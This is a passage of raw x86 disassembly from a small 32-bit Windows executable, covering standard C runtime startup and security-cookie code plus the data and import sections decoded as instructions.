  4018d0:	sub    eax,0x400000
  4018d5:	push   eax
  4018d6:	push   0x400000
  4018db:	call   0x401830
  4018e0:	add    esp,0x8
  4018e3:	test   eax,eax
  4018e5:	je     0x401921
  4018e7:	mov    eax,DWORD PTR [eax+0x24]
  4018ea:	shr    eax,0x1f
  4018ed:	not    eax
  4018ef:	and    eax,0x1
  4018f2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4018f9:	mov    ecx,DWORD PTR [ebp-0x10]
  4018fc:	mov    DWORD PTR fs:0x0,ecx
  401903:	pop    ecx
  401904:	pop    edi
  401905:	pop    esi
  401906:	pop    ebx
  401907:	mov    esp,ebp
  401909:	pop    ebp
  40190a:	ret    
  40190b:	mov    eax,DWORD PTR [ebp-0x14]
  40190e:	mov    eax,DWORD PTR [eax]
  401910:	xor    ecx,ecx
  401912:	cmp    DWORD PTR [eax],0xc0000005
  401918:	sete   cl
  40191b:	mov    eax,ecx
  40191d:	ret    
  40191e:	mov    esp,DWORD PTR [ebp-0x18]
  401921:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401928:	xor    eax,eax
  40192a:	mov    ecx,DWORD PTR [ebp-0x10]
  40192d:	mov    DWORD PTR fs:0x0,ecx
  401934:	pop    ecx
  401935:	pop    edi
  401936:	pop    esi
  401937:	pop    ebx
  401938:	mov    esp,ebp
  40193a:	pop    ebp
  40193b:	ret    
  40193c:	int3   
  40193d:	int3   
  40193e:	int3   
  40193f:	int3   
  401940:	int3   
  401941:	int3   
  401942:	int3   
  401943:	int3   
  401944:	int3   
  401945:	int3   
  401946:	int3   
  401947:	int3   
  401948:	int3   
  401949:	int3   
  40194a:	int3   
  40194b:	int3   
  40194c:	int3   
  40194d:	int3   
  40194e:	int3   
  40194f:	int3   
  401950:	mov    edi,edi
  401952:	push   ebp
  401953:	mov    ebp,esp
  401955:	mov    eax,DWORD PTR [ebp+0x8]
  401958:	mov    ecx,0x5a4d
  40195d:	cmp    WORD PTR [eax],cx
  401960:	je     0x401966
  401962:	xor    eax,eax
  401964:	pop    ebp
  401965:	ret    
  401966:	mov    ecx,DWORD PTR [eax+0x3c]
  401969:	add    ecx,eax
  40196b:	xor    eax,eax
  40196d:	cmp    DWORD PTR [ecx],0x4550
  401973:	jne    0x401981
  401975:	mov    edx,0x10b
  40197a:	cmp    WORD PTR [ecx+0x18],dx
  40197e:	sete   al
  401981:	pop    ebp
  401982:	ret    
  401983:	int3   
  401984:	int3   
  401985:	int3   
  401986:	int3   
  401987:	int3   
  401988:	mov    edi,edi
  40198a:	push   ebp
  40198b:	mov    ebp,esp
  40198d:	sub    esp,0x14
  401990:	and    DWORD PTR [ebp-0xc],0x0
  401994:	and    DWORD PTR [ebp-0x8],0x0
  401998:	mov    eax,ds:0x402004
  40199d:	push   esi
  40199e:	push   edi
  40199f:	mov    edi,0xbb40e64e
  4019a4:	mov    esi,0xffff0000
  4019a9:	cmp    eax,edi
  4019ab:	je     0x4019ba
  4019ad:	test   esi,eax
  4019af:	je     0x4019ba
  4019b1:	not    eax
  4019b3:	mov    ds:0x402008,eax
  4019b8:	jmp    0x401a24
  4019ba:	lea    eax,[ebp-0xc]
  4019bd:	push   eax
  4019be:	call   DWORD PTR ds:0x403044
  4019c4:	mov    eax,DWORD PTR [ebp-0x8]
  4019c7:	xor    eax,DWORD PTR [ebp-0xc]
  4019ca:	mov    DWORD PTR [ebp-0x4],eax
  4019cd:	call   DWORD PTR ds:0x40302c
  4019d3:	xor    DWORD PTR [ebp-0x4],eax
  4019d6:	call   DWORD PTR ds:0x403028
  4019dc:	xor    DWORD PTR [ebp-0x4],eax
  4019df:	call   DWORD PTR ds:0x403048
  4019e5:	xor    eax,DWORD PTR [ebp-0x4]
  4019e8:	lea    ecx,[ebp-0x4]
  4019eb:	xor    eax,ecx
  4019ed:	mov    DWORD PTR [ebp-0x4],eax
  4019f0:	lea    eax,[ebp-0x14]
  4019f3:	push   eax
  4019f4:	call   DWORD PTR ds:0x403034
  4019fa:	mov    eax,DWORD PTR [ebp-0x10]
  4019fd:	xor    eax,DWORD PTR [ebp-0x14]
  401a00:	mov    ecx,DWORD PTR [ebp-0x4]
  401a03:	xor    ecx,eax
  401a05:	cmp    ecx,edi
  401a07:	je     0x401a11
  401a09:	test   DWORD PTR ds:0x402004,esi
  401a0f:	jne    0x401a16
  401a11:	mov    ecx,0xbb40e64f
  401a16:	mov    DWORD PTR ds:0x402004,ecx
  401a1c:	not    ecx
  401a1e:	mov    DWORD PTR ds:0x402008,ecx
  401a24:	pop    edi
  401a25:	pop    esi
  401a26:	mov    esp,ebp
  401a28:	pop    ebp
  401a29:	ret    
  401a2a:	int3   
  401a2b:	int3   
  401a2c:	int3   
  401a2d:	int3   
  401a2e:	int3   
  401a2f:	push   0x30000
  401a34:	push   0x10000
  401a39:	call   DWORD PTR ds:0x403054
  401a3f:	pop    ecx
  401a40:	pop    ecx
  401a41:	ret    
  401a42:	int3   
  401a43:	int3   
  401a44:	int3   
  401a45:	int3   
  401a46:	int3   
  401a47:	int3   
  401a48:	jmp    DWORD PTR ds:0x403060
  401a4e:	int3   
  401a4f:	int3   
  401a50:	int3   
  401a51:	int3   
  401a52:	int3   
  401a53:	int3   
  401a54:	push   0x401ab0
  401a59:	push   DWORD PTR fs:0x0
  401a60:	mov    eax,DWORD PTR [esp+0x10]
  401a64:	mov    DWORD PTR [esp+0x10],ebp
  401a68:	lea    ebp,[esp+0x10]
  401a6c:	sub    esp,eax
  401a6e:	push   ebx
  401a6f:	push   esi
  401a70:	push   edi
  401a71:	mov    eax,ds:0x402004
  401a76:	xor    DWORD PTR [ebp-0x4],eax
  401a79:	xor    eax,ebp
  401a7b:	mov    DWORD PTR [ebp-0x1c],eax
  401a7e:	push   eax
  401a7f:	mov    DWORD PTR [ebp-0x18],esp
  401a82:	push   DWORD PTR [ebp-0x8]
  401a85:	mov    eax,DWORD PTR [ebp-0x4]
  401a88:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401a8f:	mov    DWORD PTR [ebp-0x8],eax
  401a92:	lea    eax,[ebp-0x10]
  401a95:	mov    fs:0x0,eax
  401a9b:	ret    
  401a9c:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a9f:	xor    ecx,ebp
  401aa1:	call   0x4016d0
  401aa6:	jmp    0x401c71
  401aab:	int3   
  401aac:	int3   
  401aad:	int3   
  401aae:	int3   
  401aaf:	int3   
  401ab0:	mov    edi,edi
  401ab2:	push   ebp
  401ab3:	mov    ebp,esp
  401ab5:	push   DWORD PTR [ebp+0x14]
  401ab8:	push   DWORD PTR [ebp+0x10]
  401abb:	push   DWORD PTR [ebp+0xc]
  401abe:	push   DWORD PTR [ebp+0x8]
  401ac1:	push   0x4016d0
  401ac6:	push   0x402004
  401acb:	call   0x401c8a
  401ad0:	add    esp,0x18
  401ad3:	pop    ebp
  401ad4:	ret    
  401ad5:	int3   
  401ad6:	int3   
  401ad7:	int3   
  401ad8:	int3   
  401ad9:	int3   
  401ada:	int3   
  401adb:	int3   
  401adc:	int3   
  401add:	int3   
  401ade:	int3   
  401adf:	int3   
  401ae0:	ret    
  401ae1:	int3   
  401ae2:	int3   
  401ae3:	int3   
  401ae4:	int3   
  401ae5:	int3   
  401ae6:	mov    edi,edi
  401ae8:	push   ebp
  401ae9:	mov    ebp,esp
  401aeb:	push   0x0
  401aed:	call   DWORD PTR ds:0x40300c
  401af3:	push   DWORD PTR [ebp+0x8]
  401af6:	call   DWORD PTR ds:0x403008
  401afc:	push   0xc0000409
  401b01:	call   DWORD PTR ds:0x403024
  401b07:	push   eax
  401b08:	call   DWORD PTR ds:0x403020
  401b0e:	pop    ebp
  401b0f:	ret    
  401b10:	int3   
  401b11:	int3   
  401b12:	int3   
  401b13:	int3   
  401b14:	int3   
  401b15:	mov    edi,edi
  401b17:	push   ebp
  401b18:	mov    ebp,esp
  401b1a:	sub    esp,0x324
  401b20:	mov    ds:0x402140,eax
  401b25:	mov    DWORD PTR ds:0x40213c,ecx
  401b2b:	mov    DWORD PTR ds:0x402138,edx
  401b31:	mov    DWORD PTR ds:0x402134,ebx
  401b37:	mov    DWORD PTR ds:0x402130,esi
  401b3d:	mov    DWORD PTR ds:0x40212c,edi
  401b43:	data16 mov WORD PTR ds:0x402158,ss
  401b4a:	data16 mov WORD PTR ds:0x40214c,cs
  401b51:	data16 mov WORD PTR ds:0x402128,ds
  401b58:	data16 mov WORD PTR ds:0x402124,es
  401b5f:	data16 mov WORD PTR ds:0x402120,fs
  401b66:	data16 mov WORD PTR ds:0x40211c,gs
  401b6d:	pushf  
  401b6e:	pop    DWORD PTR ds:0x402150
  401b74:	mov    eax,DWORD PTR [ebp+0x0]
  401b77:	mov    ds:0x402144,eax
  401b7c:	mov    eax,DWORD PTR [ebp+0x4]
  401b7f:	mov    ds:0x402148,eax
  401b84:	lea    eax,[ebp+0x8]
  401b87:	mov    ds:0x402154,eax
  401b8c:	mov    eax,DWORD PTR [ebp-0x324]
  401b92:	mov    DWORD PTR ds:0x402090,0x10001
  401b9c:	mov    eax,ds:0x402148
  401ba1:	mov    ds:0x40204c,eax
  401ba6:	mov    DWORD PTR ds:0x402040,0xc0000409
  401bb0:	mov    DWORD PTR ds:0x402044,0x1
  401bba:	mov    DWORD PTR ds:0x402050,0x3
  401bc4:	push   0x4
  401bc6:	pop    eax
  401bc7:	imul   eax,eax,0x0
  401bca:	mov    DWORD PTR [eax+0x402054],0x2
  401bd4:	push   0x4
  401bd6:	pop    eax
  401bd7:	shl    eax,0x0
  401bda:	mov    ecx,DWORD PTR ds:0x402004
  401be0:	mov    DWORD PTR [eax+0x402054],ecx
  401be6:	push   0x4
  401be8:	pop    eax
  401be9:	shl    eax,1
  401beb:	mov    ecx,DWORD PTR ds:0x402008
  401bf1:	mov    DWORD PTR [eax+0x402054],ecx
  401bf7:	push   0x4
  401bf9:	pop    eax
  401bfa:	imul   eax,eax,0x0
  401bfd:	mov    ecx,DWORD PTR ds:0x402004
  401c03:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  401c07:	push   0x4
  401c09:	pop    eax
  401c0a:	shl    eax,0x0
  401c0d:	mov    ecx,DWORD PTR ds:0x402008
  401c13:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  401c17:	push   0x401040
  401c1c:	call   0x401ae6
  401c21:	mov    esp,ebp
  401c23:	pop    ebp
  401c24:	ret    
  401c25:	int3   
  401c26:	int3   
  401c27:	int3   
  401c28:	int3   
  401c29:	int3   
  401c2a:	int3   
  401c2b:	int3   
  401c2c:	push   0x401ab0
  401c31:	push   DWORD PTR fs:0x0
  401c38:	mov    eax,DWORD PTR [esp+0x10]
  401c3c:	mov    DWORD PTR [esp+0x10],ebp
  401c40:	lea    ebp,[esp+0x10]
  401c44:	sub    esp,eax
  401c46:	push   ebx
  401c47:	push   esi
  401c48:	push   edi
  401c49:	mov    eax,ds:0x402004
  401c4e:	xor    DWORD PTR [ebp-0x4],eax
  401c51:	xor    eax,ebp
  401c53:	push   eax
  401c54:	mov    DWORD PTR [ebp-0x18],esp
  401c57:	push   DWORD PTR [ebp-0x8]
  401c5a:	mov    eax,DWORD PTR [ebp-0x4]
  401c5d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401c64:	mov    DWORD PTR [ebp-0x8],eax
  401c67:	lea    eax,[ebp-0x10]
  401c6a:	mov    fs:0x0,eax
  401c70:	ret    
  401c71:	mov    ecx,DWORD PTR [ebp-0x10]
  401c74:	mov    DWORD PTR fs:0x0,ecx
  401c7b:	pop    ecx
  401c7c:	pop    edi
  401c7d:	pop    edi
  401c7e:	pop    esi
  401c7f:	pop    ebx
  401c80:	mov    esp,ebp
  401c82:	pop    ebp
  401c83:	push   ecx
  401c84:	ret    
  401c85:	int3   
  401c86:	int3   
  401c87:	int3   
  401c88:	int3   
  401c89:	int3   
  401c8a:	jmp    DWORD PTR ds:0x403050
  401c90:	in     al,0xff
  401c92:	(bad)  
  401c93:	inc    DWORD PTR [eax]
  401c95:	add    BYTE PTR [eax],al
  401c97:	add    BYTE PTR [edi+edi*8+0xffff],al
  401c9e:	add    BYTE PTR [eax],al
  401ca0:	(bad)  
  401ca1:	(bad)  
  401ca2:	(bad)  
  401ca3:	inc    DWORD PTR [esi+0x16]
  401ca6:	inc    eax
  401ca7:	add    BYTE PTR [edx+0x16],cl
  401caa:	inc    eax
  401cab:	add    dh,bh
  401cad:	(bad)  
  401cae:	(bad)  
  401caf:	(bad)  
  401cb0:	cli    
  401cb1:	adc    eax,0x160e0040
  401cb6:	inc    eax
  401cb7:	add    dh,bh
  401cb9:	(bad)  
  401cba:	(bad)  
  401cbb:	inc    DWORD PTR [eax]
  401cbd:	add    BYTE PTR [eax],al
  401cbf:	add    ah,dl
  401cc1:	(bad)  
  401cc2:	(bad)  
  401cc3:	inc    DWORD PTR [eax]
  401cc5:	add    BYTE PTR [eax],al
  401cc7:	add    dh,bh
  401cc9:	(bad)  
  401cca:	(bad)  
  401ccb:	jmp    FWORD PTR [edi+edx*1+0x17b00040]
  401cd2:	inc    eax
  401cd3:	add    BYTE PTR [eax],al
  401cd5:	add    BYTE PTR [eax],al
  401cd7:	add    dh,bh
  401cd9:	(bad)  
  401cda:	(bad)  
  401cdb:	inc    DWORD PTR [eax]
  401cdd:	add    BYTE PTR [eax],al
  401cdf:	add    al,bl
  401ce1:	(bad)  
  401ce2:	(bad)  
  401ce3:	inc    DWORD PTR [eax]
  401ce5:	add    BYTE PTR [eax],al
  401ce7:	add    dh,bh
  401ce9:	(bad)  
  401cea:	(bad)  
  401ceb:	dec    DWORD PTR [ebx]
  401ced:	sbb    DWORD PTR [eax+0x0],eax
  401cf0:	push   ds
  401cf1:	sbb    DWORD PTR [eax+0x0],eax

Disassembly of section .data:

00402000 <.data>:
  402000:	add    DWORD PTR [eax],eax
  402002:	add    BYTE PTR [eax],al
  402004:	dec    esi
  402005:	out    0x40,al
  402007:	mov    ebx,0x44bf19b1
	...

Disassembly of section .idata:

00403000 <.idata>:
  403000:	ret    0x32
  403003:	add    BYTE PTR [eax],al
  403005:	add    BYTE PTR [eax],al
  403007:	add    BYTE PTR [edx-0x7ffffcd],bl
  40300d:	xor    al,BYTE PTR [eax]
  40300f:	add    BYTE PTR [eax],al
  403011:	add    BYTE PTR [eax],al
  403013:	add    BYTE PTR [esi],dl
  403015:	xor    eax,DWORD PTR [eax]
  403017:	add    BYTE PTR [eax],al
  403019:	add    BYTE PTR [eax],al
  40301b:	add    dh,ah
  40301d:	xor    al,BYTE PTR [eax]
  40301f:	add    dl,cl
  403021:	xor    eax,DWORD PTR [eax]
  403023:	add    BYTE PTR [esi+0x5a000033],dh
  403029:	xor    eax,DWORD PTR [eax]
  40302b:	add    BYTE PTR [ebx+esi*1+0x0],al
  40302f:	add    BYTE PTR [eax],al
  403031:	add    BYTE PTR [eax],al
  403033:	add    BYTE PTR [edx],ch
  403035:	xor    eax,DWORD PTR [eax]
  403037:	add    BYTE PTR [eax],al
  403039:	add    BYTE PTR [eax],al
  40303b:	add    dh,bl
  40303d:	xor    al,BYTE PTR [eax]
  40303f:	add    BYTE PTR [eax],al
  403041:	add    BYTE PTR [eax],al
  403043:	add    BYTE PTR [eax+0x33],dh
  403046:	add    BYTE PTR [eax],al
  403048:	mov    dh,BYTE PTR [ebx]
  40304a:	add    BYTE PTR [eax],al
  40304c:	add    BYTE PTR [eax],al
  40304e:	add    BYTE PTR [eax],al
  403050:	test   al,0x32
  403052:	add    BYTE PTR [eax],al
  403054:	call   0x32:0x7a000032
  40305b:	add    BYTE PTR [eax+0x32],dh
  40305e:	add    BYTE PTR [eax],al
  403060:	xor    al,BYTE PTR fs:[eax]
  403063:	add    BYTE PTR [eax+0x32],dl
  403066:	add    BYTE PTR [eax],al
  403068:	inc    edx
  403069:	xor    al,BYTE PTR [eax]
  40306b:	add    BYTE PTR [eax],bh
  40306d:	xor    al,BYTE PTR [eax]
  40306f:	add    BYTE PTR [eax],dh
  403071:	xor    al,BYTE PTR [eax]
  403073:	add    BYTE PTR [eax],ch
  403075:	xor    al,BYTE PTR [eax]
  403077:	add    BYTE PTR [esi],dl
  403079:	xor    al,BYTE PTR [eax]
  40307b:	add    BYTE PTR [edx+esi*1],al
  40307e:	add    BYTE PTR [eax],al
  403080:	div    BYTE PTR [ecx]
  403082:	add    BYTE PTR [eax],al
  403084:	out    0x31,al
  403086:	add    BYTE PTR [eax],al
  403088:	fdiv   DWORD PTR [ecx]
  40308a:	add    BYTE PTR [eax],al
  40308c:	add    BYTE PTR [eax],al
  40308e:	add    BYTE PTR [eax],al
  403090:	loopne 0x4030ac
  403092:	inc    eax
  403093:	add    BYTE PTR [eax+0x31],bl
  403099:	add    BYTE PTR [eax],al
  40309b:	add    BYTE PTR [eax],al
  40309d:	add    BYTE PTR [eax],al
  40309f:	add    BYTE PTR [esi+0x50000032],cl
  4030a5:	xor    BYTE PTR [eax],al
  4030a7:	add    BYTE PTR [eax+0x31],cl
	...
  4030b2:	add    BYTE PTR [eax],al
  4030b4:	aam    0x32
  4030b6:	add    BYTE PTR [eax],al
  4030b8:	add    BYTE PTR [eax],dh
  4030ba:	add    BYTE PTR [eax],al
  4030bc:	test   BYTE PTR [ecx],dh
	...
  4030c6:	add    BYTE PTR [eax],al
  4030c8:	fidiv  WORD PTR [ebx]
  4030ca:	add    BYTE PTR [eax],al
  4030cc:	cmp    al,0x30
  4030ce:	add    BYTE PTR [eax],al
  4030d0:	xor    DWORD PTR fs:[eax],eax
	...
  4030db:	add    BYTE PTR [eax],al
  4030dd:	xor    al,0x0
  4030df:	add    BYTE PTR [eax+esi*1],bl
  4030e2:	add    BYTE PTR [eax],al
  4030e4:	push   eax
  4030e5:	xor    DWORD PTR [eax],eax
	...
  4030ef:	add    BYTE PTR [edx],ch
  4030f1:	xor    al,0x0
  4030f3:	add    BYTE PTR [eax],cl
  4030f5:	xor    BYTE PTR [eax],al
  4030f7:	add    BYTE PTR [ecx+esi*1+0x0],bl
	...
  403103:	add    BYTE PTR [esp+esi*1+0x0],dl
  403107:	add    BYTE PTR [eax+esi*1],dl
  40310a:	add    BYTE PTR [eax],al
  40310c:	jl     0x40313f
	...
  403116:	add    BYTE PTR [eax],al
  403118:	jle    0x40314e
  40311a:	add    BYTE PTR [eax],al
  40311c:	xor    al,0x30
  40311e:	add    BYTE PTR [eax],al
  403120:	mov    WORD PTR [ecx],?
	...
  40312a:	add    BYTE PTR [eax],al
  40312c:	mov    ds:0x44000034,al
  403131:	xor    BYTE PTR [eax],al
	...
  403147:	add    dl,al
  403149:	xor    al,BYTE PTR [eax]
  40314b:	add    BYTE PTR [eax],al
  40314d:	add    BYTE PTR [eax],al
  40314f:	add    BYTE PTR [edx-0x7ffffcd],bl
  403155:	xor    al,BYTE PTR [eax]
  403157:	add    BYTE PTR [eax],al
  403159:	add    BYTE PTR [eax],al
  40315b:	add    BYTE PTR [esi],dl
  40315d:	xor    eax,DWORD PTR [eax]
  40315f:	add    BYTE PTR [eax],al
  403161:	add    BYTE PTR [eax],al
  403163:	add    dh,ah
  403165:	xor    al,BYTE PTR [eax]
  403167:	add    dl,cl
  403169:	xor    eax,DWORD PTR [eax]
  40316b:	add    BYTE PTR [esi+0x5a000033],dh
  403171:	xor    eax,DWORD PTR [eax]
  403173:	add    BYTE PTR [ebx+esi*1+0x0],al
  403177:	add    BYTE PTR [eax],al
  403179:	add    BYTE PTR [eax],al
  40317b:	add    BYTE PTR [edx],ch
  40317d:	xor    eax,DWORD PTR [eax]
  40317f:	add    BYTE PTR [eax],al
  403181:	add    BYTE PTR [eax],al
  403183:	add    dh,bl
  403185:	xor    al,BYTE PTR [eax]
  403187:	add    BYTE PTR [eax],al
  403189:	add    BYTE PTR [eax],al
  40318b:	add    BYTE PTR [eax+0x33],dh
  40318e:	add    BYTE PTR [eax],al
  403190:	mov    dh,BYTE PTR [ebx]
  403192:	add    BYTE PTR [eax],al
  403194:	add    BYTE PTR [eax],al
  403196:	add    BYTE PTR [eax],al
  403198:	test   al,0x32
  40319a:	add    BYTE PTR [eax],al
  40319c:	call   0x32:0x7a000032
  4031a3:	add    BYTE PTR [eax+0x32],dh
  4031a6:	add    BYTE PTR [eax],al
  4031a8:	xor    al,BYTE PTR fs:[eax]
  4031ab:	add    BYTE PTR [eax+0x32],dl
  4031ae:	add    BYTE PTR [eax],al
  4031b0:	inc    edx
  4031b1:	xor    al,BYTE PTR [eax]
  4031b3:	add    BYTE PTR [eax],bh
  4031b5:	xor    al,BYTE PTR [eax]
  4031b7:	add    BYTE PTR [eax],dh
  4031b9:	xor    al,BYTE PTR [eax]
  4031bb:	add    BYTE PTR [eax],ch
  4031bd:	xor    al,BYTE PTR [eax]
  4031bf:	add    BYTE PTR [esi],dl
  4031c1:	xor    al,BYTE PTR [eax]
  4031c3:	add    BYTE PTR [edx+esi*1],al
  4031c6:	add    BYTE PTR [eax],al
  4031c8:	div    BYTE PTR [ecx]
  4031ca:	add    BYTE PTR [eax],al
  4031cc:	out    0x31,al
  4031ce:	add    BYTE PTR [eax],al
  4031d0:	fdiv   DWORD PTR [ecx]
  4031d2:	add    BYTE PTR [eax],al
  4031d4:	add    BYTE PTR [eax],al
  4031d6:	add    BYTE PTR [eax],al
  4031d8:	outs   dx,DWORD PTR ds:[esi]
  4031d9:	add    BYTE PTR [edi+0x58],bl
  4031dc:	arpl   WORD PTR [eax+0x74],si
  4031df:	inc    esi
  4031e0:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0xc90072
  4031e8:	pop    edi
  4031e9:	pop    edi
  4031ea:	jo     0x40324b
  4031ec:	pop    edi
  4031ed:	arpl   WORD PTR [edi+0x6d],bp
  4031f0:	ins    DWORD PTR es:[edi],dx
  4031f1:	outs   dx,DWORD PTR ds:[esi]
  4031f2:	fs add BYTE PTR gs:[eax],al
  4031f6:	adc    DWORD PTR [ecx],eax
  4031f8:	pop    edi
  4031f9:	popa   
  4031fa:	ins    DWORD PTR es:[edi],dx
  4031fb:	jae    0x403264
  4031fd:	pop    edi
  4031fe:	gs js  0x40326a
  403201:	je     0x403203
  403203:	add    cl,dh
  403205:	add    BYTE PTR [edi+0x5f],bl
  403208:	ja     0x403271
  40320a:	gs je  0x40327a
  40320d:	popa   
  40320e:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  403215:	add    dl,ah
  403217:	add    BYTE PTR [edi+0x5f],bl
  40321a:	jae    0x403281
  40321c:	je     0x40327d
  40321e:	popa   
  40321f:	jo     0x403291
  403221:	pop    edi
  403222:	je     0x40329d
  403224:	jo     0x40328b
  403226:	add    BYTE PTR [eax],al
  403228:	scas   al,BYTE PTR es:[edi]
  403229:	add    al,0x65
  40322b:	js     0x403296
  40322d:	je     0x40322f
  40322f:	add    BYTE PTR [ebx+0x1],dh
  403232:	pop    edi
  403233:	gs js  0x40329f
  403236:	je     0x403238
  403238:	and    al,0x1
  40323a:	pop    edi
  40323b:	arpl   WORD PTR [ebp+0x78],sp
  40323e:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x5f5f00ce
  403246:	jo     0x4032a7
  403248:	pop    edi
  403249:	ins    WORD PTR es:[edi],dx
  40324b:	outs   dx,DWORD PTR ds:[esi]
  40324c:	fs add BYTE PTR gs:[eax],al
  403250:	in     al,0x0
  403252:	pop    edi
  403253:	pop    edi
  403254:	jae    0x4032bb
  403256:	je     0x4032cd
  403258:	jae    0x4032bf
  40325a:	jb     0x4032c9
  40325c:	popa   
  40325d:	je     0x4032c7
  40325f:	gs jb  0x4032d4
  403262:	add    BYTE PTR [eax],al
  403264:	call   0x6ea9916a
  403269:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x5006d72
  403271:	add    al,0x5f
  403273:	ja     0x4032d8
  403275:	ins    DWORD PTR es:[edi],dx
  403276:	fs ins BYTE PTR es:[edi],dx
  403278:	outs   dx,BYTE PTR ds:[esi]
  403279:	add    BYTE PTR ds:0x65743f00,dh
  40327f:	jb     0x4032ee
  403281:	imul   ebp,DWORD PTR [esi+0x61],0x40406574
  403288:	pop    ecx
  403289:	inc    ecx
  40328a:	pop    eax
  40328b:	pop    eax
  40328c:	pop    edx
  40328d:	add    BYTE PTR [ebp+0x73],ch
  403290:	jbe    0x4032f5
  403292:	jb     0x403308
  403294:	cs fs ins BYTE PTR es:[edi],dx
  403297:	ins    BYTE PTR es:[edi],dx
  403298:	add    BYTE PTR [eax],al
  40329a:	aaa    
  40329b:	add    DWORD PTR [edi+0x63],ebx
  40329e:	outs   dx,DWORD PTR ds:[esi]
  40329f:	outs   dx,BYTE PTR ds:[esi]
  4032a0:	je     0x403314
  4032a2:	outs   dx,DWORD PTR ds:[esi]
  4032a3:	ins    BYTE PTR es:[edi],dx
  4032a4:	data16 jo 0x4032a7
  4032a7:	add    BYTE PTR [edx+0x1],ch
  4032aa:	pop    edi
  4032ab:	gs js  0x403311
  4032ae:	gs jo  0x403325
  4032b1:	pop    edi
  4032b2:	push   0x6c646e61
  4032b7:	gs jb  0x4032ee
  4032ba:	pop    edi
  4032bb:	arpl   WORD PTR [edi+0x6d],bp
  4032be:	ins    DWORD PTR es:[edi],dx
  4032bf:	outs   dx,DWORD PTR ds:[esi]
  4032c0:	outs   dx,BYTE PTR ds:[esi]
  4032c1:	add    BYTE PTR [eax],al
  4032c3:	add    BYTE PTR [ecx+ebp*2+0x73],al
  4032c7:	jo     0x403335
  4032c9:	popa   
  4032ca:	jns    0x40331f
  4032cc:	pop    ecx
  4032cd:	push   ebx
  4032ce:	inc    esp
  4032cf:	dec    ebp
  4032d0:	inc    ebx
  4032d1:	push   eax
  4032d2:	dec    esp
  4032d3:	add    BYTE PTR [ebx+0x59],dl
  4032d6:	push   ebx
  4032d7:	inc    esp
  4032d8:	dec    ebp
  4032d9:	cs inc ebx
  4032db:	push   eax
  4032dc:	dec    esp
  4032dd:	add    BYTE PTR ds:0x656c5300,ch
  4032e3:	gs jo  0x4032e6
  4032e6:	and    BYTE PTR [eax],al
  4032e8:	inc    edi
  4032e9:	gs je  0x40333f
  4032ec:	je     0x40334f
  4032ee:	jb     0x403364
  4032f0:	jne    0x403362
  4032f2:	dec    ecx
  4032f3:	outs   dx,BYTE PTR ds:[esi]
  4032f4:	outs   dx,WORD PTR ds:[esi]
  4032f6:	push   edi
  4032f7:	add    BYTE PTR [edi],cl
  4032f9:	add    BYTE PTR [ebx+0x65],dl
  4032fc:	je     0x403353
  4032fe:	outs   dx,BYTE PTR ds:[esi]
  4032ff:	push   0x6c646e61
  403304:	gs fs inc ebp
  403307:	js     0x40336c
  403309:	gs jo  0x403380
  40330c:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  403313:	gs jb  0x403316
  403316:	adc    BYTE PTR [eax],al
  403318:	inc    edi
  403319:	gs je  0x403369
  40331c:	outs   dx,DWORD PTR ds:[esi]
  40331d:	fs jne 0x40338c
  403320:	gs dec eax
  403322:	popa   
  403323:	outs   dx,BYTE PTR ds:[esi]
  403324:	fs ins BYTE PTR es:[edi],dx
  403326:	gs inc ecx
  403328:	add    BYTE PTR [eax],al
  40332a:	add    BYTE PTR [eax],al
  40332c:	push   ecx
  40332d:	jne    0x403394
  40332f:	jb     0x4033aa
  403331:	push   eax
  403332:	gs jb  0x40339b
  403335:	outs   dx,DWORD PTR ds:[esi]
  403336:	jb     0x4033a5
  403338:	popa   
  403339:	outs   dx,BYTE PTR ds:[esi]
  40333a:	arpl   WORD PTR [ebp+0x43],sp
  40333d:	outs   dx,DWORD PTR ds:[esi]
  40333e:	jne    0x4033ae
  403340:	je     0x4033a7
  403342:	jb     0x403344
  403344:	or     eax,0x74654700
  403349:	inc    ebx
  40334a:	jne    0x4033be
  40334c:	jb     0x4033b3
  40334e:	outs   dx,BYTE PTR ds:[esi]
  40334f:	je     0x4033a1
  403351:	jb     0x4033c2
  403353:	arpl   WORD PTR [ebp+0x73],sp
  403356:	jae    0x4033a1
  403358:	add    BYTE PTR fs:[ecx],dl
  40335b:	add    BYTE PTR [edi+0x65],al
  40335e:	je     0x4033a3
  403360:	jne    0x4033d4
  403362:	jb     0x4033c9
  403364:	outs   dx,BYTE PTR ds:[esi]
  403365:	je     0x4033bb
  403367:	push   0x64616572
  40336c:	dec    ecx
  40336d:	add    BYTE PTR fs:[eax],al
  403370:	adc    al,0x0
  403372:	inc    edi
  403373:	gs je  0x4033c9
  403376:	jns    0x4033eb
  403378:	je     0x4033df
  40337a:	ins    DWORD PTR es:[edi],dx
  40337b:	push   esp
  40337c:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  403383:	ins    BYTE PTR es:[edi],dx
  403384:	gs push esp
  403386:	imul   ebp,DWORD PTR [ebp+0x65],0x47001800
  40338d:	gs je  0x4033e4
  403390:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  403397:	je     0x403399
  403399:	add    BYTE PTR [ecx],dl
  40339b:	add    BYTE PTR [ebp+0x6e],dl
  40339e:	push   0x6c646e61
  4033a3:	gs fs inc ebp
  4033a6:	js     0x40340b
  4033a8:	gs jo  0x40341f
  4033ab:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  4033b2:	gs jb  0x4033b5
  4033b5:	add    BYTE PTR [eax+eax*1],cl
  4033b8:	inc    edi
  4033b9:	gs je  0x4033ff
  4033bc:	jne    0x403430
  4033be:	jb     0x403425
  4033c0:	outs   dx,BYTE PTR ds:[esi]
  4033c1:	je     0x403413
  4033c3:	jb     0x403434
  4033c5:	arpl   WORD PTR [ebp+0x73],sp
  4033c8:	jae    0x4033ca
  4033ca:	dec    ebx
  4033cb:	add    BYTE PTR [ebp+eiz*2+0x72],dl
  4033cf:	ins    DWORD PTR es:[edi],dx
